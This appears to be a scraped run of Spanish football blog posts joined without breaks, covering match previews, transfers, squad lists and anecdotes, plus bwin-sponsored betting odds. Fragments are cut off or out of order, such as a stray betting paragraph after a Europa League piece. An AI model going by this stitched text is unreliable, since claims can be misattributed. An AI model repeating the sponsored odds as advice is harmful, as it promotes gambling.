cazados.Mi compañero Borja Barba describe mejor que yo lo que es y ha sido el fútbol. Sólo pido en este post que se respete mínimamente el articulado que regula el fútbol y la labor del hermético Comité de Competición. Los castigos nunca deben ser ejemplares. No se puede sancionar mirando al tendido, acallando a los vociferantes, saciando el hambre de venganza de una afición que ve como su jugador estrella tiene que salir del campo por la dureza de un rival. Yo no digo que Ujfalusi no merezca un castigo, creo que lo merece, como poco el partido que apareja su tarjeta roja, sólo defiendo que el arte de juzgar no debe estar mediado por el ofendido. En el campo pasan muchas cosas, la mayoría de ellas no deseadas. No podemos equiparar el castigo de una entrada al límite del reglamente como la del checo con, por ejemplo, con la intención de hacer daño de Pepe contra Casquero. Los lances del juego separan ambas acciones. Sobre el césped, mientras el balón está en juego, sólo rigen el talento y el azar; y de la conjunción de ellas, las mil maneras de conseguir una victoria. Como un tribunal al que no se puede recurrir, asignamos al fútbol capacidad para hacer justicia. Queremos que sobre el césped se juzgue la mezquindad o la soberbia. Queremos que mientras rueda el balón haya lugar para las venganzas y para los homenajes, para los culpables y para los indultados, que los goles pongan a cada uno en sitio. Legitimamos la crueldad de un deporte imperfecto, respetamos –aunque a veces lo padezcamos- su carácter despótico, asumimos que así deben ser las cosas y aunque duela lo acatamos mansamente, lloramos en silencio, dejamos el tiempo pasar. La condena del cuero sobre la hierba. Abandonamos el estadio por los vomitorios como si nos dirigiéramos al cadalso.Como un concierto de los geriátricos Stones convierte la música en un acontecimiento social en el que resulta obligado dejarse ver, en el mundillo del fútbol las presentaciones pantagruélicas se han convertido en el nuevo place to be veraniego. El fútbol convertido en acontecimiento social. Ya solo falta reseñita en los ecos de sociedad del Hola. Cerca de cincuenta mil espectadores, imagina uno que con un buen porcentaje de paisanaje cafetero tras el llamamiento del mismísimo embajador, presenciaron ayer la puesta de corto del colombiano James Rodríguez, el último fajo de billetes vestido de blanco que la afición de Concha Espina ha plantado en ese interminable álbum de cromos que les han colocado en las manos. El primer objetivo, el social, el de la repercusión mediática, ya estaba cumplido.Dicen, como queriendo disculpar el hecho de que el fichaje se produzca precisamente después de un Mundial en el que el futbolista ha incrementado su valoración y su trascendencia mediática y social, que la secretaría técnica madridista manejaba desde tiempo atrás informes muy positivos sobre el exfutbolista de Mónaco y Oporto. Idénticos informes, intuyo, que los que manejaban varios centenares de clubes de toda Europa, avezados tuiteros enganchados al PDF y parabólicos de medio planeta. James no era, hasta el torneo mundialista, ningún desconocido. Su trapaso de Banfield al Oporto en 2010 ya supuso un desembolso de siete millones para los tripeiros. Hace tan solo un año (quizá hubiese sido el momento…) su pase al Mónaco significó el pago de 45 millones de euros, suficiente como para al menos intuir que un nuevo traspaso tras dejar Brasil con trazas de héroe dispararía su precio en el mercado. Ochenta millones sobre la mesa monegasca no daban lugar a mucha negociación. Agarra el dinero y corre, Rybolovlev.No vamos ahora a discutir ni la valía futbolística de James Rodríguez ni la innegable proyección de sus tiernos veintitrés añitos. El futbolista es un caramelo, un cromo cotizado, un postre apetecible. Sin embargo, su llegada puede implicar una serie de consecuencias directas no del todo deseadas ni deportivamente recomendables. ¿En qué posición viene a jugar el colombiano? ¿A quién se va a ver obligado el club a dar salida para aligerar la carga de la plantilla? ¿En qué situación queda Isco y la inversión realizada hace apenas doce meses con su contratación como base del Madrid futuro? ¿Requerirá la nueva estrella blanca de un rediseño del esquema de juego? ¿Aceptará la estrella de Colombia, el máximo goleador del pasado Mundial, el hombre de los ochenta millones de euros un rol secundario dentro del equipo, en caso de que así lo estime conveniente Ancelotti? Demasiadas incógnitas para tamaña inversión. Un empate a cero en Getafe y, bien, vale, vamos a aceptarlo, una patente dificultad para exhibir un modelo o intención de juego bien definido en los cuatro meses y pico que Luis Enrique lleva en el banquillo del FC Barcelona han colocado al técnico asturiano en posición delicada en las últimas horas. Precisamente, en ese delicado momento que precede al parón navideño. Apenas sin tiempo para maniobrar y responder a las críticas con un par de actuaciones brillantes que disipen las malas sensaciones que, al parecer, transmite el equipo (un equipo en su primera fase de construcción, no lo olvidemos) a la plana mayor del barcelonismo. La misma plana mayor que vio con excelentes ojos la llegada de Lucho como elemento indispensable en la necesaria regeneración del equipo tras la insípida aportación de Gerardo Martino.El Barça de Luis Enrique es el fiel reflejo de la personalidad de su técnico. Es un equipo hiperactivo, de nervio y energía superlativa, en ocasiones caótico e ingobernable. Entregado a la irresistible eficacia de su tridente ofensivo, preocupado por el cuánto pero despreocupado por el cómo. Es la imagen de lo que su técnico fue como futbolista: un dinamizador incansable, un torbellino que disfrutaba en el cuerpo a cuerpo y en el sometimiento del rival a base de testosterona y no de dialéctica. Y eso, quizá, es algo que no se había terminado de valorar en Can Barça antes de la aclamada incorporación del asturiano.Porque ¿supone la llegada de Luis Enrique una renuncia, en cierto modo, a algo tan irrenunciable como la marcadísima identidad del estilo barcelonista? ¿Supone, como decía el pasado viernes Santiago Segurola, una renuncia al ‘éxito popular y de marketing‘ que suponía para el club azulgrana ser el referente mundial del juego y el guardián último del estilo? Lo que más sorprendente resulta es que en una institución como el FC Barcelona nadie reparase en las particularidades de Luis Enrique como técnico (técnico, no lo olvidemos, que ya lo fuese del filial azulgrana) antes de acometer su contratación y de encomendarle la delicada tarea de la reconstrucción de un equipo estigmatizado por un pasado insuperable. Porque es difícil creer que cuatro meses, cuatro simples meses, conviertan al elegido en una equivocación. Tony Sanabria. En el partido más completo de la temporada en el Sporting, precisamente en uno de esos momentos críticos en los que la endeblez de la plantilla presagiaba un futuro de lo más funesto, el atacante paraguayo firmó un hat-trick (segundo de la temporada) en la goleada a la Real Sociedad para colocarse con nueve goles en catorce partidos. Si acostumbrara a repartir más sus dianas…Antonio Adán.Se lo dan a Alexanco pero es la barrera americana la que toca antes del tanto. 1-1 en Bogotá contra un equipo al que ni el mejor psíquico le hubiera vaticinado los milagros del futuro. Fútbol carcel. “Venimos a confraternizar y nos cosen a patadas”, lloró Santamaría. “Este resultado me da pie a sentirme optimista de cara al futuro”, declaró un Bilardo ignorante de que su futuro era el último lugar de la clasificación al Mundial. Así era cuando no era la roja. Under, vulnerable y decepcionante. ¿Algo más? Ah sí, Colombia ni vestía de amarillo. Iban de un naranja pálido, frutal. Como queriendo absorber la sabiduría de Rinus Michels por el tejido. Eran el zapote mecánico. Chapoteando como un gorrino por la morralla futbolística austral encontré el siguiente titular: “Tradicional São Bento promete multar jogadores gordinhos” Según lo ví supe que tenía tema para la entrega de los lunes en Diarios de Fútbol.Resulta que el presidente del muy infrafutbolero São Bento, club que milita en la tercera división paulista, ha anunciado que multará a todos los jugadores que regresen de las francachelas navideñas con sobrepeso. Se vigilará si el botón de la camisa aun es capaz de reprimir la lorza y el que se vaya de punto con los mantecados deberá abonar una multa de dos reales por cada kilo sobrante. Hasta aquí todo normal, lógico, casi occidental. Lo curioso de la historia es que lo recaudado en multas se invertirá en una barbacoa para toda la plantilla. Si tenemos en cuenta que el castigo asciende a un euro por kilo nos podemos figurar el grado de compromiso que se le supone a los angelitos. Genios, como estos tres artistas del comer, estos tres paradigmas del buen diente.Míticos zampabollos fueron  los chavales del Arsenal pre-Wenger. Nada de dieta, nada de abstinencia, nada de vergüenza… Hambrienta de algo más que de éxitos, la plantilla de aquel Arsenal noventero que entrenaba George Graham fue tan famosa por la glotonería de sus integrantes como por la racanería de su juego. “Solíamos hacer concursos de comida antes de los partidos” Al aparato el insigne Paul Merson. “Ya sabes, sobre quien podía comer más pasteles en el autobús de camino a Newcastle o sitios similares”Mark Bosnich siempre andaba metido en harina. Cuando no le agarraban dando positivo por cocaína le cazaban escamoteando un bollo escondido tras la espalda. Figura memorable del fútbol inglés de los noventa, el portero del Manchester United, Chelsea y Aston Villa era un tragón impenitente. Lo demuestra la notoria silueta que paseó por las áreas chicas de toda Inglaterra y caprichos como el que tuvieron que complacer los responsables del catering en la BBC antes de una intervención en directo. Dos bocadillos de bacon y cinco capuchinos se empujó la criatura de una sentada.Acabamos con el cromo señero en lo que a glotonería se refiere, Antonio Cassano. Hay tantas y tan buenas del Talentino…A mi me pierde especialmente la anécdota gastronómico-ferroviaria. Y es que el italiano devoró las reservas de aperitivos del AVE volviendo de Córdoba tras un intrascendente partido de Copa con el Real Madrid. Imaginen a ese pibe de Bari, mofletudo, amontonando bolsas y bolsas de ruffles bajo el chándal hasta hincharse como el muñeco de Michelín o mejor, hasta parecer un Rafa Benítez de la última época, y no les quedará otra que sonreir.Por cierto, felices fiestas, felices pitanzas a todos los lectores de DDF. Aprovechando que el Villarreal recibe al Nápoles recordamos la última visita, destrozo, del equipo partenopeo a la Comunidad Valenciana.A más de un veterano del San Paolo se le asomará una sonrisa a la cara pensando en el levante español. Y no hablo, sé que resulta complejo imaginar otro cuadro, de catas masivas de sangría  y asaltos húmedos al grueso de la población femenina. La llave de ese compartimento de la memoria, archivado un 17 de septiembre de 1992, la tiene Daniel Fonseca, delantero recordado por su poderío dental y por su excelsa puntería en aquel Nápoles post Maradona. El conjunto partenopeo que viajó a España para medirse al Valencia en la primera ronda de la Copa de la UEFA parecía una tartana sin ruedas tras la marcha del ahora patriarca del fútbol mundial. Parecía. Hasta que agarraron la pelota Careca y especialmente Fonseca para enloquecer el marcador del Luis Casanova (1-5). En el 20, en el 60, en el 63, en el 88 y en el 90. Siempre de zurda menos el bailecito frente a Sempere en el último. Fonseca para la historia. “La Premier League es una liga de mierda, no es nada. De verdad, el nivel que hay es impactante. Cada equipo sólo cuenta con tres buenos jugadores. Si quitas a esos futbolistas el resto no servirían ni para jugar en el colista de la liga holandesa. La Bundesliga es mucho mejor” Parece que alguien no se ha tomado bien su reciente despido… Arrancó el décimoprimer proyecto consecutivo de Osasuna en Primera y el objetivo sigue siendo el mismo que el marcado al inicio del viaje: la permanencia. Es cierto que los de El Sadar, y que el lector me disculpe aquí la disidencia con lo mercantil, han alternado en el salón de los exitosos en varias ocasiones durante estas once temporadas. Recuerden la final de Copa, los viajes UEFA o el alucinante cuarto puesto con Javier Aguirre, pero no es menos cierto que casi siempre han tenido que remangarse para escapar del lodo. Ahí están sus clasificaciones: 15, 17, 11, 13, 15, 4, 14, 17, 15 y 12. Al mando estará por tercer curso consecutivo José Antonio Camacho. Izco ha querido que el ex-seleccionador sea el eje del nuevo proyecto y le ha mantenido en el cargo pese a los reproches encendidos de una parte de la afición encabezada por Indar Gorri. Tendrá que sobreponerse a eso y sacar el jugo a una plantilla veterana que no va sobrada precisamente de calidad.La falta de puntería y una irregularidad exasperante en el juego fueron las señas de identidad de los navarros la temporada pasada y les privaron del premio europeo que en ocasiones rondaron. La contribución goleadora del siempre  letal (rifle por algo) Walter Pandiani no fue suficiente y por ello se ha fichado a Dejan Lekic. Serbio, internacional y con 193 centímetros de credencial viene de marcar 15 tantos en liga con el Estrella Roja durante su última temporada y es la apuesta rojilla para poner el electrónico a funcionar. La partida de atacantes la completan un Aranda cada vez más alejado del prometedor futbolista que llego a ser y Kike Sola, que vuelve a España tras su aventura en el Levadiakos griegoy no parece contar con la confianza del entrenador (estuvo a punto de salir cedido). La noticia del verano en Pamplona ha sido la venta de Azpilicueta al Marsella. La operación, necesaria en tiempos de crisis y casi inevitable para un equipo como Osasuna, priva a Camacho de una pieza clave en defensa. Para sustituirle se ha confiado en dos jugadores experimentados y que curiosamente llegan a Pamplona procedentes del mismo equipo, del Betis. Damiá (de perfil ofensivo por su pasado como interior en las inferiores del Bercelona) y el portugués Nelson (cedido que ya estuvo a las órdenes de Camacho en el Benfica) Monreal, Flaño, Sergio y el complemento experto de Josetxo deberían garantizar, junto a la savia nueva, que la defensa de Osasuna se mantenga tan fiable como en la temporada pasada. Si hay carencias en la realización al menos los de atrás deben de estar impecables.El resto de líneas también se ha reforzado.Soriano llega del Almería para cimentar un centro del campo en el que Juanfran y Camuñas deberán de ser protagonistas junto con el veterano Puñal. De ellos ha de salir el juego osasunista. Y la duda son los iraníes. Clase no les falta ni a Nekounam ni al controvertido Masoud, que estuvo todo el verano con un pie fuera de la entidad rojilla, pero las dudas sobre su rendimiento son más que evidentes en la grada. Si a esto unimos su injustificado retraso a la hora de incorporarse a los entrenamientos comprenderemos que el año que les queda por delante en Pamplona va a ser complicado. Y es una pena porque son dos de los escasos futbolistas con capacidad para aportar fantasía y novedad al esquema de Camacho. Para competir por los tres palos llegó Asier Riesgo. Experimentado, tiene que ser el sucesor del Ricardo, un clásico de la liga que aun rindió a buen nivel en la última campaña.Lo mejor: Esperanza de mejora en el apartado goleador con Walter Pandiani y Lekic.Lo peor: Excesiva veteranía. Una grada enfrentada al presidente y al entrenadorPronóstico. Sufrir para salvarse hasta el final.En un Mundial las sentencias son, si cabe, más graves. Los clubes son más llevaderos, tres competiciones por temporada, margen de error, fichajes, destituciones… Pero una Copa del Mundo es otra cosa. Cada cuatro años, sin tiempo para la equivocación, sin reinserciones. La intensidad que vivimos se queda grabada durante años. Se vuelve tema recurrente, glosamos nuestra vida a través de lo que vimos. Todos sabemos perfectamente donde y con quien estábamos cuando Tassotti le rompió la nariz a Luis Enrique. Podemos rememorar esas sensaciones con sólo cerrar los ojos. Allí donde el fútbol dictó sentencia, en un banquillo de acusados donde escuchamos lo que este deporte cruel tenía preparado para nosotros.Para mí, ayer se hizo justicia. España pasó a semifinales. Superamos el muro. Y no lo hicimos agarrados a la belleza, más bien desarrapados y mezquinos. Lentos, fallones, dispersos, aburridos. Especulando con el tiempo, sonreídos por la suerte, en un partido con más trabajo que florituras. Paradójico mercererlo cuando menos lo hemos merecido. Un horror para los amantes de la lírica, para los que creían que íbamos a ganar el Mundial convirtiendo el fútbol –un deporte tosco que se juega con los pies y en el que lo habitual es patear o bien a un rival o bien a una esfera de cuero- en una suerte de Ballet del Bolshoi. Están empeñados en hacernos sufrir, en estrujar nuestros corazones. Los jugadores, los árbitros, los contrarios. Y no es que presuma de ser un resultadista, es que el resultado es lo único que nos mantiene vivos. En el partido de anoche se dio un volantanzo a la historia. Las semifinales no están ahí por mérito o demérito de nadie, parece que nos han sido dadas, que el fútbol ha decidido que ya era el momento de estar. Y lo permite caprichosamente, alejándonos de un juego que tenía embelesado a medio mundo. A la italiana, como bromeábamos ayer. Abrazados a la improvisación, mirando el reloj. Haciéndonos grandes como un equipo pequeño. Y de una cosa estoy seguro, este planteamiento agónico engancha.Por la tarde, el fútbol también tuvo trabajo. Decidió que Argentina tenía que irse a casa. Él, que les dio a Maradona y a Messi, se hartó de la prepotencia y la soberbia de un técnico que vuelve a la tierra sin corona. Diego es un provocador, también un motivador. La albiceleste es una selección centrípeta, donde Maradona es el eje. Todo gira en torno a él, difícil es no culparle del pésimo partido ante Alemania. Los germanos van a otra cosa. Aburren ya. Están siempre.Una cenicienta en toda regla, que irá a al Mundial a divertirse y aprender, esperando su oportunidad.Si algo puede ofrecer la selección eslovena es rigor táctico, entusiasmo y confianza en sus posiblidades, y esto hay que ponerlo en el haber del joven técnico Matjas Kek, absoluto desconocido fuera del país hasta que tomó las riendas de la selección tras el mundial de Alemania, y que ha mejorado sensiblemente a un grupo de futbolistas que. . De entre ellos podemos destacar al mencionado Koren, que ejerce de cerebro en el equipo y es fijo en el West Brom; el delantero Novakovic, un tanque que recuerda bastante a Zigic en la forma de jugar; el portero Samir Handanovic –no confundir con su primo Jasmin, también guardameta y también convocado-, Dalibor Stevanovic, que jugó en la Real, y Radosavljevic, volante tapón de mucho recorrido. Estos serán los chicos que van a pasar un verano inolvidable en Sudáfrica, y que, al menos, aspirarán a generar simpatía en los neutrales y a dejar algún momento para el recuerdo. Como aquella noche en Moscú. Lo mejor: el orden que suele guardar el equipo, y la visibilidad que la presencia en el Mundial presta al país.Lo peor: la escasez de calidad técnica del plantel.Jugador a seguir: Tim Matavz, que gozará de minutos en la delantera tras su buen año en Holanda.Pronóstico DDF: Primera fase.Porteros: – Samir Handanovic (Udinese)– Jasmin Handanovic (Mantova)– Aleksander Seliga (Sparta Rotterdam)Defensas: – Miso Brecko (FC Colonia)– Bostjan Cesar (Grenoble)– Branko Ilic (Lokomotiv Moscú)– Matej Mavric-Rozic (Koblenz)– Bojan Jokic (Chievo)– Marko Suler (Ghent)– Suad Filekovic (NK Maribor)– Elvedin Dzinic (NK Maribor)Medios: – Andraz Kirm (Wisla Cracovia)– Robert Koren (West Brom)– Valter Birsa (AJ Auxerre)– Andrej Komac (Maccabi Tel Aviv)– Dalibor Stevanovic (Vitesse Arnhem)– Aleksandar Radosavljevic (Larissa)– Rene Krhin (Inter de Milán)Delanteros: – Milivoje Novakovic (FC Colonia)– Zlatko Dedic (VfL Bochum)– Zlatan Ljubijankic (Ghent)– Nejc Pecnik (Nacional Funchal)– Tim Matavz (Groningen). No hay demasiados equipos en Primera División que se definan tanto a través de sus entrenadores como el Real Sporting y el Real Madrid, que abren esta tarde a las 18 horas la jornada 15 del campeonato de Liga, ya con el Clásico en el horizonte. Manolo Preciado y Jose Mourinho gozan de posiciones de gran poder en dos clubs de caràcter eminentemente presidencialista, y mantienen un hilo directo con la cúspide que refleja el modo de entender su profesión en Inglaterra. Ambos han impreso en sus equipos el sello de sus poderosas personalidades, cuentan con el respeto de sus hombres y la veneración de sus aficiones, y se les considera, más allá de sus respectivas formas de ser, especialmente apropiados para el puesto que desempeñan. Cabezas visibles de las instituciones, jefes de la tribu.Visto en perspectiva, resultaba inevitable que dos de los caracteres más irreductibles del fútbol español chocaran tarde o temprano, y el momento llegó en Septiembre: irritado por la presencia de habituales suplentes del Sporting en el Camp Nou, la versión más on fire de Mourinho sacó la metralleta contra su colega cántabro, al que acusó veladamente de dejarse perder el partido. Sintiéndose a la vez insultado e invadido en un terreno que consideraba únicamente de su incumbencia, Preciado respondió a las indirectas del portugués con una de las invectivas más duras jamás escuchadas de un entrenador contra un colega en activo, coronada por un “canalla” que acabó de titular a cinco columnas. Todo el asunto resultó bastante desagradable, ensució la imagen de ambos protagonistas y dio lugar a un recibimiento especialmente hostil al Madrid en su visita al Molinón. El partido, como no podía ser de otro modo, resultó tenso y duro, y paradójicamente –o quizá no tanto- lo acabó inclinando Karim Benzema, el más sereno de los futbolistas.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. El partido de vuelta resultó un monumento a la ironía, esa figura juguetona que de cuando en cuando se hace notar en el ámbito futbolero. Con el Madrid jugándose la Liga a vida o muerte, llegó al Bernabéu el entrenador que teóricamente tiraba los partidos y acabó llevándose los tres puntos, dejando a los merengues heridos de muerte en la competición y, de propina, reventando la imbatibilidad local de Mou: nueve años, quizá el récord individual más impresionante firmado en los tiempos modernos por un entrenador de alto nivel. Fijándonos estrictamente en lo deportivo, y aun obviando algo la carga final del Madrid y lo aislado en el segundo tiempo del gol de De Las Cuevas, merece la pena echar un vistazo al centro del campo blanco que jugó ese partido: Lass, Khedira y Granero. Adiós Liga.Estos son los precedentes inmediatos de la batalla que veremos esta noche. Aunque la Mareona recordará sin duda desaires pasados para obtener energía y aportarla a su equipo, y no ayudarán las recientes palabras de Damián Suárez o el propio Florentino, es muy probable que el ambiente esta noche no resulte tan eléctrico como la temporada pasada. El Sporting se ha estabilizado -Levante aparte- en los últimos partidos, el Madrid es una balsa de aceite mantenida entre impresionantes resultados y descenso de ruido, y las aguas han vuelto a su cauce entre Mourinho y Preciado. La felicitación de Mou a la plantilla del Sporting tras su gesta en Madrid limó asperezas, y una llamada del portugués tras el fallecimiento del padre de Manolo tornó en relación cordial la antigua animadversión entre los dos hombres. Algo que sin duda dará menos titulares, pero nos ayudará a concentrarnos en el único duelo que realmente nos interesa, el deportivo.La casa de apuestas bwin.com ofrece jugosas cuotas de apuestas para un partido cuyo pronóstico es menos claro de lo que parece. Con Xabi Alonso sancionado y Sahin aún ejerciendo de incógnita, las posibilidades del Sporting se multiplican. El simple empate ya se paga a 5,75, la victoria local a 12. Si prevemos un partido de pocos goles, tal y como fueron los dos últimos, hay que tener en cuenta que menos de dos goles se pagan a 5,25. Más tantos en el segundo tiempo, circunstancia probable en un partido que se supone físico, da 2,05 de rédito. Y si hay que jugarse una apuesta arriesgada pero inteligente, pensemos en una falta de Sahin, que ya tiró una en el Bernabéu: 5 euros de rédito, 21 si abre el marcador. Se enfrenta esta tarde el Real Madrid al Real Sporting en el Santiago Bernabéu (20,00 h.) en uno de esos típicos partidos primaverales que funcionan más como previa de lo que va a venir detrás que por su propia entidad. Para los blancos, el encuentro dará paso a la semana más dura e importante del curso, con las semifinales frente al Bayern a la vuelta de la esquina y, encajonado entre ellas, el gran Clásico frente al Barcelona. Los rojiblancos, por su parte, seguramente no cuentan a priori con estos puntos, y lo que les espera es un tour a vida o muerte que los enfrentará a Rayo, Español, Villarreal, Betis y Málaga, y en el que apurarán sus últimas opciones de mantener la categoría.La noticia deportiva en el Madrid que saltará esta noche será la ausencia de Xabi Alonso, el eslabón medio de una columna que han vertebrado durante todo el curso Casillas, Ramos y Cristiano, y cuya persistencia y rendimiento –apenas han faltado- han resultado fundamentales en la magnífica temporada que está firmando el equipo blanco. El precedente más cercano es el encuentro contra el Apoel, donde Sahin sustituyó sorprendentemente a Alonso, para luego desaparecer de la dinámica del equipo tan rápido como apareció. El experimento no fue malo, aunque el equipo español no fue capaz de resolver el partido hasta su tramo final. Ante un conjunto asturiano que planteará una táctica parecida, quizá lo más deseable para el Real fuera la presencia de Sahin y Granero, ya que el partido demandará creatividad y un ritmo rápido de pase para romper la resistencia rival.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Otra posibilidad para Mourinho es la integración en el once, de nuevo, de Kaká y Mesut Özil. El brasileño ha pasado una mala semana, tras airearse ciertos reproches del entrenador por su mala actitud defensiva, y firmar un partido de muy bajo nivel en el Calderón –fue sustituido pronto por el alemán, que le mejoró instantáneamente-. Sin embargo, también es cierto que Kaká ha firmado este año buenos partidos este curso contra equipos “pequeños”, y disfruta cuando el contrario no le exige correr hacia atrás. En estas condiciones puede ser clave, como también puede serlo un Di María que sigue integrándose en la dinámica del conjunto, y que todo el mundo prevé crucial para el tramo final de la temporada. De momento, en el Calderón vimos una versión excesivamente individualista del argentino, fuera de una correa de transmisión colectiva, que, en parte por ello, resultó deficitaria. Veremos hoy si el Madrid incrementa su nivel de juego, porque si no va a ser difícil que aguante el ritmo del Barcelona -y de Messi– en lo que queda de temporada.El Sporting, por su parte, se agarra al recuerdo de la machada del año pasado –en la que curiosamente también faltó Xabi-, al buen partido en el Camp Nou y a la remontada ante el Levante para concebir esperanzas de sacar algo parecido del coliseo de la Castellana. Sin embargo, el ambiente no es propicio para la gesta en un club que, desde la marcha de Preciado, funciona como un generador de noticias negativas. En realidad resulta muy de agradecer que Clemente haya establecido la ley del silencio, después de su rajada contra los futbolistas –luego matizada-, de llamar chusma a los periodistas, de sus críticas a socios, y su enfrentamiento con Gancedo, salpicado de alusiones personales, que dio vergüenza ajena. Con parte de la afición pitando al equipo en el último partido, bien les valdrá a los jugadores generar anticuerpos y aislarse, porque la experiencia demuestra que de estas situaciones se sale sobre todo con unión. Hoy faltará Barral después de muchos partidos, también Rivera y Eguren, y es probable que el entrenador vuelva a recurrir a Sangoy después del golazo del último partido. Es duda el lateral derecho Pedro Orfila, con una contractura, y de su presencia dependerá dónde juegue Lora, uno de los mejores valores del Sporting. La solución, en unas horas. El partido ofrece bastantes alicientes para los aficionados a las apuestas. En bwin, el mero empate del Sporting se paga a 12’50, y la victoria visitante a 26. Si pensamos que Clemente tendrá éxito con su cerrojo y saldrá un partido de pocos goles, hay que plantearse que el under 4 se paga a 2’40, y el under 3 a 4’33. Si Cristiano consigue por fin hacer saltar en pedazos su propio récord y marca el primero, se paga a 3’00, y otro teórico hat-trick (lleva siete ya) a 3’50.Ni los cambios, ni los sistemas, son una cadena de montaje de equipos vencedores. Ayer golearon. Acabaron con el sueño redentor del pibe. Le dedico al Pelusa una frase de “El hombre que mató a Liberty Valance” que podría describir su vida: En el Oeste, cuando la leyenda supera a la verdad, publicamos la leyenda. Este será el Mundial de Maradona, de su lengua incendiada, de un equipo que pudo reinar pero fue condenado, torturado por la realidad del fútbol, por aquella ley que dice que un equipo se construye desde la defensa. Donde el talento de los delanteros no puede suplir la falta de ideas, donde el mejor jugador del mundo juega asfixiado y solo. Hace falta algo más que camaradería para ser grande. Ayer las cámaras captaron a Diego explicando lo que era el fútbol, lo que Argentina debía hacer ante los alemanes. Como un orangután golpeándose el pecho. Demasiada soberbia para un deporte poco tolerante con los favoritismos.Uruguay, Holanda, Alemania y España. Son los que quedan, los indultados, los que ahora celebran libres el éxito. Miremos atrás y recordemos a los que se han ido, los que duermen en una piltra entre barrotes… harían temblar a cualquiera. Italia, Francia, Brasil, Argentina… protagonistas en otras citas, candidatos a todo, culpables hoy según el caprichoso pero inapelable dictado de un juez llamado fútbol. Y esto aún no ha terminado,  todavía quedan tres camas vacías. Como la hermana fea que acompaña a su hermana guapa al baile, hoy empieza la ronda eliminatoria de  la Europa League. Aprovechando que los octavos de la Liga de Campeones tampoco han sido muy lucidos, es una buena oportunidad para darle algo de cancha a esa otra Europa. Los partidos no desmerecen y el concurso de los clubes españoles puede ser ilusionante: Athletic – Andelecht, Villarreal – Wolfsburgo, Brujas – Valencia y Atlético de Madrid – Galatasaray. Buenos cruces de dieciseisavos en un campeonato que intenta asentarse en el escaparate futbolístico europeo. El nuevo formato ayuda a eso y no es aquel extenuante cuadro de la UEFA, cuya acumulación de partidos y liguillas hacían difícil seguir el torneo.Finalmente, como apuesta arriesgada, estaría bien pensar en un gol de Trejo, que mojó en el último partido y a quien Clemente parece tener fe. Se paga a 5’00. Tanto hablar de que si liga escocesa, si dualidad tóxica o todo lo que se quiera, y cuando se aproxima la zona Cesarini de la temporada, donde decía Luis Aragonés que se ventilaba el bacalao, en los principales campeonatos del continente los títulos de liga son cosa de dos. Y no de unos cualquiera, que siete de los ocho implicados son campeones de Europa. Recordémoslos.Italia. El mundo del fútbol saludó la irrupción de la nueva Juventus de Conte como un rayo de luz en medio de las tinieblas del fútbol italiano. El fútbol combinativo y el gusto por el toque de esta versión posmoderna y chic de la Vecchia Signora quedaba simbolizado por el fichaje de Pirlo, faro durante años de un Milan que, dejándole marchar, también realizaba una clara declaración de intenciones. Espoleado por el éxito del pasado ejercicio, en el que se alzó con el título, Allegri ha profundizado en un plan basado en el ritmo lento, un centro del campo más corretón que técnico –gran rendimiento en particular de Prince-Boateng– y, sobre todo, la confianza en que Ibrahimovic es capaz de generar por sí solo el suficiente caudal ofensivo para aspirar al título. La apuesta triunfa de momento, con el cuadro rossonero aún vivo en la Champions League, y a dos puntos de un rival que aún se mantiene imbatido en la Serie A tras treinta partidos jugados. El calendario restante favorece claramente al Milan, al que sólo le queda el defenestrado Inter como rival destacado, mientas que la Juve deberá enfrentar a Palermo, Lazio o Roma. A pesar de que los blanquinegros tienen ganados los enfrentamientos particulares, el pronóstico debe ser que el campeón repita título. Máxime si la lógica se impone en el Camp Nou el martes.Inglaterra. Hace ya bastante tiempo que la Premier League viene exhalando un cierto tufo a decadencia, y no resulta ajeno a ello que los únicos equipos que a día de hoy aspiran a ganarla, gigantes invulnerables sobre el papel, hayan sido despedidos sucesivamente tanto de la Liga de Campeones como de una Europa League donde sobreviven Metalist Kharkiv, Hannover 96 o Sporting de Portugal. Si hace tres meses no parecía haber dudas de que el City se llevaría el trofeo, y si hace un mes escaso todos pensábamos que la Liga se decidiría en el choque de trenes del 28 de Abril en el City of Manchester, hoy lo que no se sabe es si para entonces los citizens no se habrán despedido ya del trofeo. Un equipo que comenzó maravillando con la eléctrica adaptación del Kun Agüero y el nivel sobrehumano de Silva, y que a día de hoy, con el canario exhausto y su compañero casi desaparecido, ofrece una triste imagen de desunión y cansancio competitivo que vuelve muy difícil confiar en su fiabilidad. Enfrente el United, que ha exhibido un nivel muy discreto toda la temporada y sufrido golpes de tremenda dureza -1-6 del propio City, eliminación ante el Basilea, cuasi-humillación del Athletic-, pero se agarra al nervio y al carácter ganador para renovar el título en una competición que es ya casi su coto privado. Si vence mañana en Blackburn se irá a cinco puntos, y en su calendario no aparece ni una nube, derby aparte. Lo tienen fácil.Alemania. No es casualidad que la liga más saneada de Europa, la que más espectadores lleva a los estadios, la que más los cuida y la que más va creciendo en interés se desarrolle en el país donde menos ha golpeado la crisis, haya colocado representantes tanto en cuartos de la Champions como de la Europa League, y esté liderada por uno de los equipos más atractivos del continente. El Borussia Dortmund de Jürgen Klopp comenzó la temporada disminuido por la nostalgia de Nuri Sahin y quizá demasiado bisoño para afrontar la Champions, pero ha crecido durante la temporada a partir de la integración de Gundogan, el excepcional rendimiento de Lewandowski y la vuelta de Kagawa a sus mejores niveles de juego. Recuperada la confianza a partir de un fútbol asociativo de alto nivel, se ha sobrepuesto incluso a la ausencia por lesión de su mejor hombre –Mario Götze– para liderar la Bundesliga a falta de ocho jornadas para el final. Sin embargo, es muy difícil apostar por la identidad del campeón, y es que no debe ser sencillo sentir cada semana por detrás el aliento de la bestia que llaman Bayern Munich. Los de Heynckes, que iniciaron el campeonato a dentelladas y se vinieron abajo tras la lesión de Schweinsteiger, han vuelto a golpe de goleada (20 goles en tres partidos) y amenazan a un rival que ya ven a tres puntos y con quien se enfrentarán en diez días en el antiguo Westfalen. Con Robben y Ribéry en gran forma, el gatillo de Mario y Basti de vuelta, todo es posible. El calendario les favorece ligeramente, aunque juega en su contra una probabilísima semifinal de Champions que se presenta monumental y exigente hasta el límite. Gran incertidumbre.España. Y llegamos aquí, donde el duelo de titanes que presenciamos no tiene parangón ni en el presente ni en el pasado. Nunca en una gran liga hubo tanta diferencia entre los dos grandes y los demás, nunca reprodujeron tan claramente la rivalidad los dos mejores jugadores y los dos mejores entrenadores del mundo, nunca cayeron tan rápidos los goles, tan veloces los récords, 